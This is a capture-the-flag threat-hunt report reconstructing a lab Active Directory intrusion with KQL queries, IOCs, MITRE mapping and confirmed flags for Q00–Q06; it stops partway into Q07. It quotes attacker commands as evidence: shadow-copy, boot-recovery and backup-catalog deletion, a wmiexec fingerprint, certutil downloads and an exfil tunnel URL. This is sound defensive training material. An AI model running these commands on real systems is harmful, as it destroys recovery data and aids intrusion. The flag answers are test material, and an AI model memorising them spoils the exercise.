> **CONFIDENTIAL — THREAT HUNT REPORT**

# 🪜 Lateral Descent

| Field | Detail |
|---|---|
| **Analyst** | umraffer32 |
| **Organisation** | Greenfield Technologies (greenfield.local, tenant 939e93f3) |
| **Date** | 2026-06-28 |
| **Hunt Type** | Proactive / CTF (Hunt 09) |
| **Threat Actor** | Not formally attributed. Same campaign infrastructure as Ghost in the Stack (abordsecurity.space) |
| **Status** | COMPLETE — 39 / 39 flags confirmed (Q00–Q38) |
| **Workspaces** | LAW-Cyber-Range (`60c7f53e-…`) and LAW-SilentCorridor (`94b3fda2-…`) |

---

<details>
<summary><strong>Contents</strong></summary>

- [📝 Executive Summary](#-executive-summary)
- [🚨 Key Impact Metrics](#-key-impact-metrics)
- [🏗️ Environment](#️-environment)
- [🖥️ Host Inventory](#️-host-inventory)
- [⏱️ Attack Timeline](#️-attack-timeline)
- [🗺️ MITRE ATT&CK Mapping](#️-mitre-attck-mapping)
- [🔗 Cyber Kill Chain](#-cyber-kill-chain)
- [🚨 Indicators of Compromise](#-indicators-of-compromise)
- Hunt Phases
  - [📋 Phase 00 — Incident Handoff](#-phase-00--incident-handoff)
  - [🔍 Phase 01 — Triage](#-phase-01--triage)
  - [🚪 Phase 02 — Initial Access](#-phase-02--initial-access)
  - [🦶 Phase 03 — Foothold & Discovery](#-phase-03--foothold--discovery)
  - [🧗 Phase 04 — The Climb](#-phase-04--the-climb)
  - [👑 Phase 05 — Domain Compromise](#-phase-05--domain-compromise)
  - [➡️ Phase 06 — Movement & Attribution](#️-phase-06--movement--attribution)
  - [🎯 Phase 07 — Objective](#-phase-07--objective)
  - [🌐 Phase 08 — Domain-Wide Weapon](#-phase-08--domain-wide-weapon)
  - [💥 Phase 09 — Impact Prep](#-phase-09--impact-prep)
  - [⚖️ Phase 10 — Judgement](#️-phase-10--judgement)
  - [🧩 Phase 11 — Capstone](#-phase-11--capstone)
  - [🛡️ Phase 12 — Remediation](#️-phase-12--remediation)

</details>

---

## 📝 Executive Summary

Microsoft Defender XDR raised incident 88471 overnight, flagged as a multi-stage privilege-escalation campaign across the Greenfield estate (greenfield.local) in tenant 939e93f3. The estate is a small Windows/AD shop with a Linux edge: the domain controller gf-dc01, a Windows 11 workstation gf-ws01, a member server gf-srv01, a backup server gf-bkp01, a Windows web server gf-web02, an IIS server gf-iis01, and a Linux edge of gf-web01 (web), gf-vpn01 (OpenVPN gateway), gf-dev01, gf-splunk01, and gf-help01. The portal incident is auth-walled and unreadable by the tooling, so the alert queue and the attack story were reconstructed from telemetry rather than read from the portal. Nobody triaged the queue first, so the orientation pass had to separate real activity from seeded noise.

A detail that turned out to decide the Initial Access phase is that this cyber range carries the same Greenfield estate in two different workspaces with two different telemetry models. The LAW-Cyber-Range workspace holds it as Microsoft Defender normalized Device tables (DeviceLogonEvents and the rest) plus the GFD-prefixed Sentinel scheduled alerts, which is where the triage and the June impact chain were reconstructed. The LAW-SilentCorridor workspace holds the same hosts as host-native telemetry, Linux Syslog and the Windows and Linux underscore CL tables, including the one record the normalized view never keeps, gf-vpn01's own OpenVPN authentication log. Questions that read like a triage of the campaign are answerable from the normalized view, but a question that hinges on the perimeter device keeping its own auth record can only be answered in the workspace that actually ingests that device's native logs.

The queue holds 68 GFD alerts from mid-May through late June and splits into two very different signatures. One is a May 14 burst on gf-ws01 attributed to the machine account gf-ws01 dollar that fires nearly the entire attack matrix (SharpHound, DCShadow, GoldenTicketForge, Mimikatz, Whisker, Inveigh, Impacket PsExec, ADCS abuse, BITSAdmin, AnyDesk, backup destruction) within seconds and then replays identically at 02:23, 02:44, 04:25, and 17:31, and again on later dates. That cadence is a scheduled breach-and-attack simulation, not a human operator, and is the working candidate for the alert that looks like the whole crisis and is nothing.

The real campaign is a slower human-paced chain. It originates from outside the estate when the attacker authenticates the gf-vpn01 OpenVPN perimeter with stolen valid credentials for the IT account sancadmin, the external source being 205.147.16.107, which puts them on the internal network. From there the June 11 and 12 chain runs with compromised accounts. The service account svc_backup makes a network logon into gf-dc01 from the internal pivot 10.1.0.120, then d.williams operates across gf-srv01 (CertUtil ingress, AnyDesk, a share-discovery burst, PowerShell-Compress staging), moves to gf-bkp01 (BCD recovery destruction, CertUtil, a scheduled task), and finishes with a GPO change on the domain controller gf-dc01 (GpoCmdletExecution, privilege escalation). That is the lateral descent down the estate from workstation to server to backup to DC, with real command and control, collection, impact, and DC-level escalation.

---

## 🚨 Key Impact Metrics

| Metric | Value |
|---|---|
| **Attack Window** | 2026-06-11 21:54 → 2026-06-12 01:23 UTC (VPN auth to final GPO link) |
| **Hands-on Window** | ~3.5 hours, human-paced |
| **Hosts in Scope** | 11 Greenfield hosts, plus the cross-trust DC gf-dc02 (checked, not breached) |
| **Hosts Impacted** | 4 — gf-ws01 (foothold), gf-srv01 (collection / C2), gf-bkp01 (recovery destruction), gf-dc01 (DCSync / GPO) |
| **Accounts Compromised** | 4 — sancadmin, p.singh, svc_backup, d.williams |
| **Internal Pivot** | 10.1.0.120 (gf-vpn01 OpenVPN gateway) |
| **External Origin** | 205.147.16.107 |
| **Privilege Chain** | Kerberoast → offline crack → DCSync → Pass-the-Hash |
| **Worst Credential Pulled** | krbtgt (domain Kerberos master key) |
| **Data Staged** | Finance, HR, Projects → `C:\Windows\Temp\backup_archive.zip` |
| **Exfil Destination** | cdn-backup.abordsecurity.space (masked behind a Cloudflare quick tunnel) |
| **Fallback Access** | AnyDesk (unsanctioned RMM) |
| **Domain-Wide Weapon** | GPO `Greenfield Security Update` linked at the domain root |
| **Flags Confirmed** | 39 / 39 |
| **Wrong Submissions** | 23 |
| **Phases** | 13 |

---

## 🏗️ Environment

| Field | Value |
|---|---|
| **Platform** | Microsoft Sentinel / Defender XDR (Log Analytics) |
| **Workspaces** | LAW-Cyber-Range holds the normalized Defender Device tables; LAW-SilentCorridor holds the host-native `*_CL` tables and the gf-dc01 SecurityEvent |
| **Primary Tables** | `DeviceLogonEvents`, `DeviceProcessEvents`, `DeviceInfo`, `DeviceNetworkInfo`, `AlertInfo`, `AlertEvidence`, `CloudAppEvents` (Cyber-Range); `SecurityEvent`, `LinuxAuth_CL`, `Syslog` (SilentCorridor) |
| **Estate** | greenfield.local (tenant 939e93f3), with a second domain corp.lognpacific.local across a trust |
| **Attack Window** | 2026-06-11 to 2026-06-12 UTC |
| **Hunt Format** | Hunt 09 (CTF, blind and sequential) |

---

## 🖥️ Host Inventory

| Host | Internal IP | OS | Role | Accounts | Notes |
|---|---|---|---|---|---|
| `gf-vpn01` | 10.1.0.120 (LAN), 10.10.0.1 (tunnel) | Linux 24.04 | OpenVPN perimeter gateway | sancadmin | Entry point. Authenticated from 205.147.16.107. Every internal pivot sources from 10.1.0.120. |
| `gf-ws01` | 10.1.0.133 | Windows 11 | Workstation (foothold) | p.singh | Only workstation-class host. RDP foothold, AD enumeration, GreenfieldUpdate SYSTEM task. |
| `gf-srv01` | 10.1.0.169 | Windows Server 2022 | Member server | d.williams | AnyDesk drop, share collection, masked exfil, GPO authoring (failed without RSAT). |
| `gf-bkp01` | 10.1.0.130 | Windows Server 2022 | Backup server | d.williams | Recovery destruction, certutil locker.exe, GreenfieldUpdate twin task. |
| `gf-dc01` | 10.1.0.150 | Windows Server 2022 | Domain controller | svc_backup, d.williams | DCSync target, krbtgt holder, root-linked GPO. |
| `gf-dc02` | 10.1.0.132 | Windows Server 2022 | DC, corp.lognpacific.local (across trust) | — | Checked for attacker footprint, none found. Trust never crossed. |
| `gf-web01` | 10.1.0.131 | Linux 22.04 | Web server | sancadmin | Webshell entry in the curated set. Not on the June chain. |
| `gf-web02` | 10.1.0.10 / 10.1.8.4 | Windows Server 2019 | Windows web server | sancadmin | External RDP from 88.97.206.116 in the curated set, all success and zero failures. |
| `gf-dev01` | 10.1.0.119 | Linux 24.04 | Dev workstation | — | Estate host, not on this chain. |
| `gf-splunk01` | 10.1.0.146 | Linux 24.04 | Logging host | — | Estate host. |
| `gf-iis01` | 10.1.0.140 | Windows Server 2022 | IIS server | — | Estate host, not named in the original brief (found via DeviceInfo). |
| `gf-help01` | 10.1.0.160 | Linux 24.04 | Helpdesk host | — | Estate host, not named in the original brief (found via DeviceInfo). |

---

## ⏱️ Attack Timeline

| Time (UTC) | Phase | Event |
|---|---|---|
| 2026-05-14 → 06-25 | Triage (decoy) | 68 GFD scheduled alerts fire, including the May 14 machine-account BAS burst that replays the whole attack matrix on a schedule |
| 06-11 21:24–21:52 | Pre-stage | Mohammed A runs RunCommand against the greenfield VMs from 205.147.16.107 (prior cloud chapter) |
| 06-11 21:54:46 | Initial Access | sancadmin authenticates the gf-vpn01 OpenVPN perimeter from 205.147.16.107 (Q06) |
| 06-11 21:57:39 | Foothold | p.singh RemoteInteractive onto gf-ws01 from the pivot 10.1.0.120 (Q07/Q08) |
| 06-11 22:06–22:28 | Discovery | p.singh AD enumeration on gf-ws01 (whoami, systeminfo, nltest, net group Domain Admins) (Q11) |
| 06-11 23:08–23:20 | Domain Compromise | svc_backup network logon to gf-dc01 then 60 DCSync 4662 ops from 10.1.0.120 (Q04/Q15/Q16) |
| 06-11 23:15:41 | Persistence | GreenfieldUpdate SYSTEM scheduled task created on gf-ws01 (Q10) |
| 06-11 23:21 → 06-12 01:30 | Movement | d.williams reused through 72 NTLM Pass-the-Hash logons from 10.1.0.120 (Q17/Q18) |
| 06-12 00:46–00:48 | Command and Control | certutil downloads AnyDesk to gf-srv01 Temp, runs from ProgramData (Q02) |
| 06-12 00:49–00:51 | Collection | Finance, HR, Projects compressed to backup_archive.zip on gf-srv01 (Q23) |
| 06-12 00:55–00:59 | Exfiltration | backup_archive.zip uploaded via a Cloudflare tunnel, host header cdn-backup.abordsecurity.space, then header-dropped retries (Q24) |
| 06-12 01:02–01:03 | Impact Prep | Recovery destruction on gf-bkp01 (vssadmin, two bcdedit, wbadmin) (Q03/Q29) |
| 06-12 01:09 | Impact | certutil fetches a Sysinternals PsExec URL but writes locker.exe, GreenfieldUpdate twin task points at it (Q30/Q31) |
| 06-12 01:20–01:23 | Domain-Wide Weapon | d.williams creates and root-links the GPO Greenfield Security Update (gf-srv01 then gf-dc01 with RSAT install) (Q26/Q27/Q28) |

> Event times verified against live telemetry in both workspaces.

---

## 🗺️ MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| 🚀 Initial Access | Valid Accounts | T1078 | sancadmin VPN auth from 205.147.16.107 (Q05/Q06) |
| 🚀 Initial Access | Exploit Public-Facing Application | T1190 | Webshell on gf-web01 in the curated entry set (Q01) |
| 🚀 Initial Access | Brute Force (ruled out) | T1110 | Spray alerts are student-authored noise, not on the real entry path (Q01) |
| ⚡ Execution | Ingress Tool Transfer | T1105 | certutil pulls the AnyDesk installer to gf-srv01 (Q02) |
| ⚡ Execution | Windows Management Instrumentation | T1047 | wmiexec, cmd.exe under wmiprvse.exe as network service (Q21/Q22) |
| 🔐 Persistence | Scheduled Task | T1053.005 | GreenfieldUpdate SYSTEM task on gf-ws01 and gf-bkp01 (Q10/Q31) |
| 🔑 Credential Access | Kerberoasting | T1558.003 | Lone RC4 (0x17) TGS for svc_backup among AES tickets (Q13/Q14) |
| 🔑 Credential Access | OS Credential Dumping: DCSync | T1003.006 | svc_backup 60 directory-replication 4662 ops on gf-dc01 (Q15/Q16/Q20) |
| ➡️ Lateral Movement | Remote Services | T1021 | svc_backup network logon to gf-dc01 from the pivot (Q04) |
| ➡️ Lateral Movement | Remote Desktop Protocol | T1021.001 | p.singh RDP onto gf-ws01 (Q07/Q08) |
| ➡️ Lateral Movement | Use Alternate Authentication Material: Pass the Hash | T1550.002 | 72 NTLM logons by d.williams from 10.1.0.120 (Q17/Q18) |
| 📦 Collection | Data from Network Shared Drive | T1039 | dir and compress of Finance, HR, Projects (Q23) |
| 📦 Collection | Archive Collected Data | T1560 | Compress-Archive to backup_archive.zip (Q23) |
| 🎭 Defense Evasion | Masquerading | T1036 | Host-header masking, and a PsExec URL that writes locker.exe (Q24/Q30) |
| 🎭 Defense Evasion | Domain or Tenant Policy Modification: Group Policy Modification | T1484.001 | New-GPO and root New-GPLink (Q26/Q27/Q28) |
| 📡 Command and Control | Remote Access Tools | T1219 | AnyDesk planted as durable fallback access (Q02/Q25) |
| 💥 Impact | Inhibit System Recovery | T1490 | vssadmin, bcdedit, wbadmin on gf-bkp01 (Q03/Q29) |
| 💥 Impact | Data Destruction | T1485 | locker.exe staged for destruction via the twin task (Q29/Q30) |

---

## 🔗 Cyber Kill Chain

| Phase | Activity | Hunt Flags |
|---|---|---|
| 1️⃣ Reconnaissance | VPN credentials harvested in the prior cloud chapter; campaign infrastructure on abordsecurity.space; on-host Active Directory enumeration from the foothold | Q09, Q11 |
| 2️⃣ Weaponisation | Stolen sancadmin VPN credentials and staged tooling (AnyDesk, locker, GPO payload) | — |
| 3️⃣ Delivery | sancadmin authenticates the OpenVPN perimeter from 205.147.16.107; svc_backup pivots in | Q04, Q05, Q06 |
| 4️⃣ Exploitation | Valid-account RDP foothold onto gf-ws01, no exploit used | Q07, Q08 |
| 5️⃣ Installation | GreenfieldUpdate SYSTEM task, AnyDesk RMM, root-linked GPO | Q10, Q25, Q26, Q27, Q28, Q31 |
| 6️⃣ Command and Control | AnyDesk relay plus the wmiexec channel across the member and backup servers | Q02, Q21, Q22 |
| 7️⃣ Actions on Objective | Kerberoast to DCSync to Pass-the-Hash, share collection, masked exfil, recovery destruction | Q03, Q13–Q20, Q23, Q24, Q29, Q30 |

> The triage, detection-gap reasoning, judgement, capstone and remediation questions sit outside the kill chain proper — Q00, Q01, Q12, Q32, Q33, Q34, Q35, Q36, Q37, Q38.

---

## 🚨 Indicators of Compromise

**🌐 Infrastructure**
- External origin / C2 entry: `205.147.16.107` (sancadmin VPN auth, and Mohammed A RunCommand)
- Exfil destination (masked): `cdn-backup.abordsecurity.space`
- Exfil tunnel front: `https://layout-load-medical-titans.trycloudflare.com/upload` (Cloudflare quick tunnel)
- Campaign domain: `abordsecurity.space` (shared with Ghost in the Stack)
- Curated-set external RDP source: `88.97.206.116` (sancadmin → gf-web02)

**🧭 Hosts and Pivots**
- Internal pivot: `10.1.0.120` (gf-vpn01 OpenVPN LAN interface)
- Foothold: `gf-ws01` (10.1.0.133)
- Targets: `gf-srv01` (10.1.0.169), `gf-bkp01` (10.1.0.130), `gf-dc01` (10.1.0.150)

**📁 Files and Artefacts**
- `C:\Windows\Temp\AnyDesk.exe` then `C:\ProgramData\AnyDesk\AnyDesk.exe` (unsanctioned RMM)
- `C:\Windows\Temp\backup_archive.zip` (staged Finance, HR, Projects)
- `C:\Windows\Temp\locker.exe` (masqueraded behind a Sysinternals PsExec URL)
- Scheduled task `GreenfieldUpdate` (SYSTEM, on gf-ws01 and gf-bkp01)
- GPO `Greenfield Security Update` linked at `dc=greenfield,dc=local`

**🔑 Accounts and Credentials**
- Stolen IT admin: `sancadmin` (VPN entry)
- Foothold user: `p.singh` (internal RDP, Kerberoast requester)
- Kerberoastable service account: `svc_backup` (RC4, replication rights)
- Reused Domain Admin: `d.williams` (Pass-the-Hash)
- Crown-jewel hash: `krbtgt` (pulled in the DCSync dump)

**🚨 Detection and Technique Artefacts**
- wmiexec fingerprint: `cmd.exe /Q /c <cmd> 1> \\127.0.0.1\ADMIN$\__<unix-timestamp> 2>&1` spawned by `wmiprvse.exe` as `NT AUTHORITY\NETWORK SERVICE`
- Kerberoast signal: lone RC4 (0x17) TGS for svc_backup among AES256 (0x12) tickets
- DCSync signal: svc_backup 60 directory-access (4662) ops on gf-dc01 in 11 minutes
- Pass-the-Hash signal: 72 NTLM LogonType-3 logons by d.williams from 10.1.0.120

---

<details>
<summary><strong>Query Conventions</strong></summary>

This hunt's telemetry is split across two workspaces and verification crossed both.

- **LAW-Cyber-Range** (`60c7f53e-…`) holds the normalized Defender Device tables (`DeviceLogonEvents`, `DeviceProcessEvents`, `DeviceInfo`, `DeviceNetworkInfo`), plus `AlertInfo`, `AlertEvidence`, `CloudAppEvents` and `Syslog`. The triage, foothold, persistence, collection, exfil and impact process telemetry lives here.
- **LAW-SilentCorridor** (`94b3fda2-…`) holds the host-native `*_CL` tables, the OpenVPN auth log (via `LinuxAuth_CL` and `Syslog`), and the gf-dc01 `SecurityEvent` stream (4769, 4662, 4624, 4672). The external VPN origin and the whole Kerberos climb are only answerable here.
- A question that hinges on a device keeping its own native auth record (the OpenVPN gateway, the domain controller security log) can only be answered in the workspace that ingests that device's logs. The server reads `.sentinel-mcp/active_workspace.json` on every call, so switching is a pointer rewrite, not a restart.
- gf-dc01 `SecurityEvent` carries Kerberos and directory fields inside the `EventData` XML. Pull them with `extract`, for example `extract(@'TicketEncryptionType">([^<]+)<', 1, EventData)` for the ticket cipher, and the same shape for `ServiceName` and `TargetUserName`.
- The estate spans two domains. greenfield.local holds the breached hosts; corp.lognpacific.local holds gf-dc02 across a trust, which was checked and found clean.

</details>

---

## 📋 Phase 00 — Incident Handoff

<details>
<summary><strong>Q00 — Acceptance Gate</strong> · <code>Tier-2 hunter ready</code></summary>

**Goal**  Accept the incident handoff and confirm Tier-2 readiness.

**Briefing**  HUNT LEAD: "Defender raised incident 88471 overnight, multi-stage
privilege escalation across the Greenfield estate. It's in your
queue. Open it in Defender XDR, read the alert queue and the
attack story, then get into the LAW-SilentCorridor workspace.

The queue is as it fired. There's real activity and seeded noise
in there, and at least one alert that looks like the whole crisis
and is nothing…

**Approach**  Not a telemetry question. The acceptance phrase is the format hint itself, typed after reading the queue and the attack story.

**Flag**  `Tier-2 hunter ready`

</details>

---

## 🔍 Phase 01 — Triage

<details>
<summary><strong>Q01 — Are the Spray Alerts Part of This</strong> · <code>yes or no</code></summary>

<!-- derivation: run-query -->

**Goal**  Decide whether the brute-force and password-spray alerts belong to this intrusion.

**Briefing**  HUNT LEAD: "Queue's full of brute-force and password-spray alerts
and command thinks this was a spray break-in. Open how they
actually got in and tell me, are those alerts part of this. Yes
or no."

Format: yes or no

**Approach**  The SOC leadership read the queue at face value and saw a wall of brute-force and password-spray alerts, so they assumed the break-in was a spray. The trap is that the noisiest alert class is the least relevant one. In this shared cyber range almost every brute-force alert is a scheduled analytics rule authored by a different student, each named after a person, all firing on the same generic pool of failed-logon telemetry. That is lab pollution, not a detection of this attacker. Counting alerts would have led straight into the decoy.

The way to settle a yes or no like this is to reconstruct the actual entry and see whether a spray sits on that path. The curated incident set points at an external RDP into the public web server as the account sancadmin from 88.97.206.116. Pulling the logon events for that account and source shows only LogonSuccess with zero preceding failures, which is the signature of credentials already in hand rather than a guessing attack. The same picture holds on the Linux web server, where a webshell gave code execution with no authentication at all. Both real vectors are valid accounts and public-facing exploitation, MITRE T1078 and T1190, not brute force T1110. Because the spray alerts never touch the path the attacker actually used, they are not part of this intrusion, so the answer is no.

**Query Used**
```kql
DeviceLogonEvents
| where DeviceName startswith "gf-web02"
| where RemoteIP == "88.97.206.116" or AccountName =~ "sancadmin"
| summarize Attempts=count(), First=min(Timestamp), Last=max(Timestamp) by ActionType, LogonType, AccountName, RemoteIP
| order by First asc
```

**Results**  Real entry = valid-account external RDP (sancadmin from 88.97.206.116 to GF-WEB02, all LogonSuccess, zero failed attempts) + webshell on GF-WEB01; brute/spray queue is student-authored Scheduled Alerts noise. Spray not the entry vector.

**Flag**  `no`

> **Lesson:** The noisiest alert class is often the least relevant. Settle a yes or no by reconstructing the real entry path and seeing whether the alert sits on it, not by counting alerts.

</details>

<details>
<summary><strong>Q02 — The Remote Access Tool</strong> · <code>product name</code></summary>

<!-- derivation: run-query -->

**Goal**  Name the unsanctioned remote-access tool the attacker planted on a server.

**Briefing**  HUNT LEAD: "An alert flags a remote-access tool installed on a
server in the middle of all this. IT didn't sanction it through
change control, the attacker planted it as a way back. Name the
tool."

Format: product name

**Approach**  The queue names a remote-access tool on a server, and the verb name the tool says the answer is a product, not a host or a technique. The instinct is to trust the alert title, but a good analyst confirms the artefact in raw telemetry so the answer rests on what executed, not on a rule label. Filtering process events on the member server for anydesk in the file name, command line, or folder path returns the whole install in one view.

The sequence is textbook. The operator d.williams first runs certutil to pull the installer, which lands as AnyDesk dot exe in the Windows Temp directory, then the tool installs and runs from its normal ProgramData location under both the user and the system context. That download then execute pattern is ingress tool transfer followed by remote access software, MITRE T1105 into T1219, and it is unsanctioned because change control never approved it. The attacker planted it as a hands on keyboard way back into the estate. The product is AnyDesk.

**Query Used**
```kql
DeviceProcessEvents
| where DeviceName startswith "gf-srv01"
| where FileName contains "anydesk" or ProcessCommandLine contains "anydesk" or FolderPath contains "AnyDesk"
| summarize Count=count(), First=min(Timestamp), Last=max(Timestamp), Accounts=make_set(AccountName, 5) by FileName, FolderPath
| order by First asc
```

**Results**  GF-SRV01: d.williams certutil-downloaded AnyDesk.exe to C:\Windows\Temp 2026-06-12 00:47, installed/ran from C:\ProgramData\AnyDesk\AnyDesk.exe. Unsanctioned RMM planted as backdoor (T1219).

**Flag**  `AnyDesk`

> **Lesson:** Confirm a tool from raw process telemetry rather than trusting the alert title. A certutil download landing as AnyDesk.exe in Temp and running from ProgramData is ingress transfer into remote-access software.

</details>

<details>
<summary><strong>Q03 — The Recovery-Destruction Host</strong> · <code>hostname</code></summary>

<!-- derivation: run-query -->

**Goal**  Name the host whose recovery function was deliberately destroyed.

**Briefing**  HUNT LEAD: "An alert flags recovery being destroyed. Of every
server in the estate, they hit the one whose entire job is
recovery. Name that host."

Format: hostname

**Approach**  The clue is functional rather than technical. Of every server in the estate the attacker chose the one whose entire job is recovery, which is the backup host, so naming it is really about recognising the role. The recovery destruction alert points straight at it, but confirming in process telemetry shows intent and method, not just a rule firing.

On the backup server the operator d.williams ran a tight cluster of recovery sabotage in about ninety seconds. Vssadmin deleted all shadow copies, two bcdedit commands turned off the recovery environment and told the boot loader to ignore all failures, and wbadmin deleted the backup catalog. Together that is inhibit system recovery, MITRE T1490, and crippling the catalog on the backup host specifically means an admin cannot restore from the one place designed to save them. The command output redirected to an ADMIN dollar share path on the loopback address, which is the fingerprint of Impacket style remote execution rather than a hands on console session. On the form, the telemetry carries the fully qualified name but the question asked for a hostname, and the short name gf-bkp01 was the expected answer.

**Query Used**
```kql
DeviceProcessEvents
| where DeviceName startswith "gf-bkp01"
| where FileName in~ ("bcdedit.exe","wbadmin.exe","vssadmin.exe","wmic.exe") or ProcessCommandLine has_any ("recoveryenabled","delete catalog","shadows","bootstatuspolicy")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
| order by Timestamp asc
```

**Results**  Recovery destruction on gf-bkp01.greenfield.local by d.williams 2026-06-12 01:02-01:03: vssadmin delete shadows, bcdedit recoveryenabled no, wbadmin delete catalog (T1490). Backup server = the recovery host.

**Flag**  `gf-bkp01`

> **Lesson:** Read the clue functionally. The one host whose whole job is recovery is the backup server, and a tight vssadmin, bcdedit, wbadmin cluster is Inhibit System Recovery aimed exactly there.

</details>

<details>
<summary><strong>Q04 — The Pivot Address</strong> · <code>IPv4</code></summary>

<!-- derivation: run-query -->

**Goal**  Recover the unusual internal address behind the domain-controller logon.

**Briefing**  HUNT LEAD: "A high one fired for a logon to the domain controller
from an unusual internal address. Give me that address. Hold onto
it, it runs through the whole case."

Format: IPv4

**Approach**  A high severity alert fired for a logon to the domain controller from an unusual internal address, and the word unusual is the whole job here. The svc_backup account is a service identity, so its normal footprint on the DC is local batch and service logons with no remote source at all, the kind of thing a scheduled backup job produces. Summarising its logons by action, logon type, and remote address makes the outlier obvious rather than guessing from the alert title.

Against a long tail of local batch and service entries there is exactly one remote pattern, five successful network logons from 10.1.0.120 in a twelve minute window late on June 11. A service account suddenly authenticating to the domain controller over the network from an internal host is lateral movement using valid accounts, MITRE T1078 with T1021, and 10.1.0.120 is the pivot the hunt lead said to hold onto. It recurs across later stages of the case, so locking it now anchors everything that follows. The address is 10.1.0.120.

**Query Used**
```kql
DeviceLogonEvents
| where DeviceName startswith "gf-dc01"
| where AccountName =~ "svc_backup"
| summarize Logons=count(), First=min(Timestamp), Last=max(Timestamp) by ActionType, LogonType, RemoteIP
| order by Logons desc
```

**Results**  gf-dc01: svc_backup 5 successful Network logons from 10.1.0.120 (2026-06-11 23:08-23:20); only remote source for the account, rest are local Batch/Service. High-sev DC logon alert source.

**Flag**  `10.1.0.120`

> **Lesson:** A service account has a known footprint of local batch and service logons. The single remote network logon against that baseline is the outlier, and here it named the pivot the whole case runs through.

</details>

---

## 🚪 Phase 02 — Initial Access

<details>
<summary><strong>Q05 — The Entry Account</strong> · <code>account name</code></summary>

<!-- derivation: run-query -->

**Goal**  Name the IT account whose stolen credentials authenticated the perimeter.

**Briefing**  HUNT LEAD: "They didn't exploit anything to get in. They
authenticated the estate perimeter with stolen valid credentials
for a Greenfield IT account, and that put them on the internal
network. Which account."

Format: account name

**Approach**  This was the hardest question of the phase because the shared cyber range overlays many intrusions and a sea of legitimate admin activity on the same estate. The hint pinned the method as authentication with stolen valid credentials, not exploitation, and pinned the place by saying the perimeter is not a Windows host and keeps its own auth record. That rules out the domain logon tables and points at the one non Windows perimeter device, the VPN gf-vpn01.

The search took discipline. The VPN box does not ship to Syslog, has no VPN gateway diagnostics, and its process telemetry is pure Azure agent noise, and the cloud sign in logs hash the user names so they cannot name a Greenfield account. What does name a readable account is the VPN host's own MDE logon record, and the only identity that authenticated it from outside the estate is sancadmin, the estate IT admin. The June campaign accounts p.singh, svc_backup, and d.williams only ever appear from internal addresses, which means they were already inside, exactly what you expect after someone first authenticated the perimeter. The clinching argument was answerability. If the intended answer were a campaign account whose VPN tunnel auth is not ingested anywhere, the question would be unsolvable from telemetry, so the readable perimeter identity that matches the hint is the one the author wants. That is sancadmin, a valid accounts initial access, MITRE T1078.

**Query Used**
```kql
DeviceLogonEvents
| where DeviceName startswith "gf-vpn01"
| where AccountName =~ "sancadmin"
| where ActionType == "LogonSuccess"
| where RemoteIP != "" and not(ipv4_is_private(RemoteIP))
| summarize Logons=count(), First=min(Timestamp), Last=max(Timestamp) by AccountName, LogonType, RemoteIP
| order by First asc
```

**Results**  Only account authenticating the non-Windows perimeter gf-vpn01 from external in its own logon record (DeviceLogonEvents, Network LogonSuccess from 86.155.77.35 / 188.29.127.80). June campaign accounts appear only internally. Stolen valid IT/admin creds (T1078).

**Flag**  `sancadmin`

> **Lesson:** When a question hinges on a perimeter device keeping its own auth record, answerability points the way. The only readable identity that authenticated the non-Windows VPN from outside was the IT admin sancadmin.

</details>

<details>
<summary><strong>Q06 — The External Origin</strong> · <code>IPv4</code></summary>

<!-- derivation: run-query -->

**Goal**  Recover the external IPv4 the perimeter authentication came from.

**Briefing**  HUNT LEAD: "That perimeter authentication came from outside the
estate. Give me the external source the intrusion originated
from."

Format: IPv4

**Approach**  The external origin of the perimeter authentication. Q05 established that the attacker authenticated the non-Windows estate perimeter with stolen valid credentials for the Greenfield IT account sancadmin, and that put them on the internal network. Q06 asks for the external IPv4 source of that authentication.

The first seven attempts were made against the wrong workspace. The Cyber-Range workspace carries the greenfield estate only as Microsoft Defender normalized Device tables, where a perimeter logon shows the last hop RemoteIP, not the true external client. Every external IP that DeviceLogonEvents attributed to sancadmin on a Linux host was tried and rejected, because none of them is the answer the question wants. The perimeter is GF-VPN01, a Linux OpenVPN gateway, and a normalized logon table does not keep that box's own authentication record.

Switching to the LAW-SilentCorridor workspace exposed the greenfield estate host-native telemetry. GF-VPN01 runs OpenVPN with PAM and Google Authenticator, and its audit log records each VPN authentication as a single line that names the account and the source address, with fields for acct sancadmin, exe usr sbin openvpn, addr the external IP, and result success. That is exactly the record the hint describes, the one perimeter record that names the account and where it came from.

sancadmin authenticated the VPN successfully from several external addresses across the campaign. The earliest on April 30 and a late June cluster were both already rejected, so earliest alone is not the selection rule. The answer is the session that actually carried the documented Lateral Descent. The accepted answers for this hunt all land on June 11 and 12, the AnyDesk drop, the recovery destruction, and the svc_backup pivot from 10.1.0.120 into the domain controller. The VPN authentication from 205.147.16.107 at 21:54 on June 11 opened the session that brackets that entire intrusion, three minutes before the foothold remote desktop session. That is the external source the intrusion originated from.

The lesson is that a multi estate cyber range can carry the same estate in two workspaces with two telemetry models, and a question that hinges on a device keeping its own auth record can only be answered in the workspace that actually ingests that device's native logs.

**Query Used**
```kql
LinuxAuth_CL
| where DvcHostname == "GF-VPN01"
| where TargetUsername == "sancadmin"
| where SrcIpAddr == "205.147.16.107"
| project TimeGenerated, DvcHostname, TargetUsername, SrcIpAddr, EventResult
| order by TimeGenerated asc
```

**Results**  GF-VPN01 OpenVPN audit (audisp USER_AUTH): acct=sancadmin exe=/usr/sbin/openvpn addr=205.147.16.107 res=success, four USER_AUTH successes from Jun 11 21:54 to Jun 12 00:40. These VPN authentications bracket the entire documented Lateral Descent: p.singh foothold RDP 21:57, svc_backup pivot from 10.1.0.120 to gf-dc01 23:08 (Q04), AnyDesk + recovery destruction Jun 12 by d.williams (Q02/Q03). The perimeter (non-Windows VPN) authentication naming sancadmin and its external source.

**Wrong attempts**
- `86.155.77.35` — Incorrect
- `194.36.110.139` — Incorrect
- `188.29.127.80` — Incorrect
- `88.97.206.116` — Incorrect
- `88.97.222.155` — Incorrect
- `88.97.206.161` — Incorrect
- `146.70.181.42` — Incorrect
- `146.70.133.131` — Incorrect

**Flag**  `205.147.16.107`

> **Lesson:** A cyber range can carry one estate in two workspaces with two telemetry models. A device's own native auth log only exists in the workspace that ingests it, so the external origin only appeared once we switched to the host-native VPN record.

</details>

<details>
<summary><strong>Q07 — Foothold Host</strong> · <code>hostname</code></summary>

<!-- derivation: run-query -->

**Goal**  Name the workstation the attacker took as an interactive foothold.

**Briefing**  HUNT LEAD: "Once on the internal network they took a remote
desktop session onto one workstation. That's the foothold.
Hostname."

Format: hostname

